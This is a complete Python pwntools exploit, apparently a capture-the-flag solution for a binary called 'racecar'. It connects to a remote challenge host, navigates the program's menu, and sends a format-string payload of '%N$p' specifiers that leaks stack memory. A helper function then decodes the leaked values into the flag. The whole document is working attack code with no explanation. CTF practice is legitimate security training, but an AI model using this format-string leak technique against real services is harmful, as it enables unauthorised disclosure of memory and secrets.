#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./racecar',checksec=False)

#p = process()
p = remote('94.237.62.184',58304)


def generate(start: int, end: int, specifier: str = "p", seperator: str = "|"):
    """ Generate a simple payload """
    payload = b""
    for i in range(start, end):
        payload += f"%{i}${specifier}{seperator}".encode()
    return payload
def fix(payload: bytes, seperator: str = "."):
    """ Unhex the payload and return as a string """
    rt = b""
    for i in payload.split(b'|')[:-1]: # the last one is empty
        i = i[2:] # removing the 0x
        if i[0] == 97: # remove the newline
            i = i[1:]
        rt += unhex(i)[::-1] # unhex and rev
    return rt

p.sendafter(b'Name: ',b'phuocloideptrai')
p.sendafter(b'Nickname: ',b'cutehihi')

p.sendafter(b'> ',b'2')
p.sendafter(b'> ',b'2')
p.sendafter(b'> ',b'1')
sleep(1)
payload = generate(12,23)
p.sendlineafter(b'> ',payload)

p.recvlines(2)
win = fix(p.recvline()[:-1])

log.success(f'flag is: {win}')
p.interactive()
